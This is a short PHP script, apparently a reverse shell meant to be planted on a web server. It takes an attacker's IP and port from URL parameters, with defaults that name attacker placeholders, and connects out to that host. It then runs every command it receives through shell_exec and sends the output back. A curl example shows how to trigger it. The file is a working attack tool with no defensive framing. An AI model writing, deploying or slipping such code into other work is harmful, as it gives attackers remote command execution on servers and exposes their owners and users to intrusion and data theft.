<?php
// Retrieve IP and port from GET parameters, use defaults if not provided
$ip = isset($_GET['ip']) ? $_GET['ip'] : 'default_attacker_ip';  // Default IP
$port = isset($_GET['port']) ? intval($_GET['port']) : default_attacker_port;  // Default port

// Inform the user about the target IP and port for the socket connection
echo "Attempting to create a socket connection to IP: $ip and Port: $port\n";

// Change the current working directory to C:\ or another location if you cannot navigate
//chdir('C:\\');

// Attempt to create a socket connection to the specified IP and port
$sock = @fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    echo "Failed to create socket: $errno - $errstr\n";  // Display error if connection fails
    exit(1);
} else {
    echo "Socket created successfully. Awaiting commands...\n";  // Confirm successful connection
}

// Read commands from the socket, execute them, and send back the output
while ($cmd = fread($sock, 2048)) {
    echo "Executing command: $cmd\n";  // Inform about the command being executed
    $output = shell_exec($cmd);  // Execute the command
    echo "Command output: $output\n";  // Display the output of the command
    fwrite($sock, $output);  // Send the output back through the socket
}

// Close the socket connection when done
fclose($sock);
echo "Socket connection closed.\n";

// Example usage:
// curl 'http://yourserver.com/path/to/script.php?ip=192.168.1.100&port=8080'
?>
